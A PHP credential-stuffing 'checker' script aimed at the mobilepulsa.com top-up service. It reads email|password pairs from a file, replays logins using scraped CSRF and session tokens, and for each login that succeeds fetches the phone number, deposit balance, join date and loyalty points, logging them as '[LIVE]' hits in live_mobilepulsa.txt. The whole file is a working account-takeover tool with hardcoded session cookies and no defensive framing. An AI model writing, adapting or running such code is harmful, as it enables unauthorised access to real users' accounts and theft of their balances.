<?php
function getStr($a,$b,$data){
	$a = @explode($a,$data)[1];
	$b = @explode($b,$a)[0];
	return $b;
}
function getcookie(){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mobilepulsa.com/login?track=sidebar");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	$headers = array();
	$headers[] = "Host: mobilepulsa.com";
	$headers[] = "Connection: close";
	$headers[] = "Cache-Control: max-age=0";
	$headers[] = "Save-Data: on";
	$headers[] = "Upgrade-Insecure-Requests: 1";
	$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36";
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "Referer: https://mobilepulsa.com/";
	$headers[] = "Accept-Language: en-US,en;q=0.9,id;q=0.8";
	$headers[] = "Cookie: _ga=GA1.2.443548550.1546378253; _gid=GA1.2.1817571557.1546378253; _fbp=fb.1.1546378254452.1429678856; XSRF-TOKEN=eyJpdiI6IlhFK1VtTGV5bTNFQjZOY3ZZQ2Yya3c9PSIsInZhbHVlIjoiR0JIN2JHUGFJbDVNS2Nla0hBa1Q0VDB6S0dxd1BraEs5bWlPTDlxdW9OdTJ4Nmh1RXRIVCs3cFlVSUFNMnJZUEVscXdBRjF1Q1lTMXZxK015c2VwY3c9PSIsIm1hYyI6IjJlN2U4ZmJjYjg2Y2E0MWNkYTkwODg2OTJkODNmZGM1NWZmN2NiMjc4ZGUwMDlkMGJiZTlkMjgyMTJhOWZlYzQifQ%3D%3D; mobilepulsa_session=eyJpdiI6ImZCOWw0WUFic3Fuak9QTjZ4ak5xaHc9PSIsInZhbHVlIjoic1VCS096U2txVDdUUXYrNVA0Z2ZYUVBsSkZIXC9hemh3VW5sUCs3TnRBMFZTdStpdkgxREM0K3ByY0dKTW5yOTZDTWlmeTZHUUVNZFZ6cE83Um04XC92UT09IiwibWFjIjoiMzY1YzRjYjNiN2IyMjZkMGU1ZTYzM2RkYjVjYjI3MjYyMzQyZDE2YzVlOGVlODI1ZDNjOWJjYjU1NDU3OTNkZCJ9; _gat=1";
	$headers[] = "If-None-Match: W/\"b8848e1d3a57de8b50ae4f420448eaa3\"";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result = curl_exec($ch);
	curl_close ($ch);
	$xsrf = getStr('Set-Cookie: XSRF-TOKEN=',';',$result);
	$msession = getStr('Set-Cookie: mobilepulsa_session=',';',$result);
	$csrf = getStr('<meta name="csrf-token" content="','"',$result);
	return array($xsrf,$msession,$csrf);
}
function check($email,$pass,$xsrf,$msession,$csrf){
	$body = "{\"hp\":\"$email\",\"password\":\"$pass\",\"destination\":\"\",\"module\":\"\"}";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mobilepulsa.com/login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	$headers = array();
	$headers[] = "Host: mobilepulsa.com";
	$headers[] = "Connection: close";
	$headers[] = "Content-Length: ".strlen($body);
	$headers[] = "Origin: https://mobilepulsa.com";
	$headers[] = "X-Xsrf-Token: $xsrf";
	$headers[] = "X-Csrf-Token: $csrf";
	$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36";
	$headers[] = "Content-Type: application/json;charset=UTF-8";
	$headers[] = "Accept: application/json";
	$headers[] = "X-Requested-With: XMLHttpRequest";
	$headers[] = "Save-Data: on";
	$headers[] = "Referer: https://mobilepulsa.com/login?track=sidebar";
	$headers[] = "Accept-Language: en-US,en;q=0.9,id;q=0.8";
	$headers[] = "Cookie: _ga=GA1.2.443548550.1546378253; _gid=GA1.2.1817571557.1546378253; _fbp=fb.1.1546378254452.1429678856; XSRF-TOKEN=$xsrf; mobilepulsa_session=$msession; _gat_UA-47324481-1=1";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result = curl_exec($ch);
	curl_close ($ch);
	$xsrf = getStr('Set-Cookie: XSRF-TOKEN=',';',$result);
	$msession = getStr('Set-Cookie: mobilepulsa_session=',';',$result);
	$message = json_decode(explode("\r\n\r\n",$result)[1],true);
	return array($xsrf,$msession,$message);
}
function getcookie2($xsrf,$msession){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mobilepulsa.com/webapp/?hp=");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	$headers = array();
	$headers[] = "Host: mobilepulsa.com";
	$headers[] = "Connection: close";
	$headers[] = "Upgrade-Insecure-Requests: 1";
	$headers[] = "Save-Data: on";
	$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36";
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "Referer: https://mobilepulsa.com/login?track=sidebar";
	$headers[] = "Accept-Language: en-US,en;q=0.9,id;q=0.8";
	$headers[] = "Cookie: _ga=GA1.2.443548550.1546378253; _gid=GA1.2.1817571557.1546378253; _fbp=fb.1.1546378254452.1429678856; _gat_UA-47324481-1=1; _gat=1; XSRF-TOKEN=$xsrf; mobilepulsa_session=$msession";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result = curl_exec($ch);
	curl_close ($ch);
	$xsrf = getStr('Set-Cookie: XSRF-TOKEN=',';',$result);
	$msession = getStr('Set-Cookie: mobilepulsa_session=',';',$result);
	$ltoken = getStr('Set-Cookie: laravel_token=',';',$result);
	$csrf = getStr('<meta name="csrf-token" content="','"',$result);
	return array($xsrf,$msession,$ltoken,$csrf);
}
function info($xsrf,$msession,$ltoken,$csrf){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://mobilepulsa.com/api/v2/account");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	$headers = array();
	$headers[] = "Host: mobilepulsa.com";
	$headers[] = "Connection: close";
	$headers[] = "Accept: application/json";
	$headers[] = "X-Xsrf-Token: $xsrf";
	$headers[] = "X-Csrf-Token: $csrf";
	$headers[] = "X-Requested-With: XMLHttpRequest";
	$headers[] = "Save-Data: on";
	$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36";
	$headers[] = "Referer: https://mobilepulsa.com/webapp/?hp=";
	$headers[] = "Accept-Language: en-US,en;q=0.9,id;q=0.8";
	$headers[] = "Cookie: _ga=GA1.2.443548550.1546378253; _gid=GA1.2.1817571557.1546378253; _fbp=fb.1.1546378254452.1429678856; _gat_UA-47324481-1=1; _gat=1; laravel_token=$ltoken; XSRF-TOKEN=$xsrf; mobilepulsa_session=$msession";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	curl_close ($ch);
	return $result;
}
$arr = array("\r","	");
$file = str_replace($arr,"",@file_get_contents($argv[1]));
$cek = @explode("\n", $file); $o = 0;
for($a=0;$a<count($cek);$a++){
	$pisah = @explode("|", $cek[$a]);
	$email = $pisah[0];
	$pass = $pisah[1];
	$c = getcookie();
	$check = check($email,$pass,$c[0],$c[1],$c[2]);
	if(!empty($check[2]['redirect'])){
		$c2 = getcookie2($check[0],$check[1]);
		$info = json_decode(info($c2[0],$c2[1],$c2[2],$c2[3]),true)['data'];
		$balance = $info['deposit'];
		$nope = $info['hp'];
		$dibuat = $info['member_since'];
		$ponta = $info['ponta'];
		$hasil = "[LIVE] $email|$pass : [$nope:$balance:$dibuat:$ponta]\n";
		$h = fopen("live_mobilepulsa.txt","a+");
		fwrite($h,$hasil);
		fclose($h);
	}else{
		$arr = array("\\","-","/");
		$hasil = "Checking [$email]\r";
		$o += 1;
		if($o>=2) $o = 0;
	}
	echo $hasil;
}
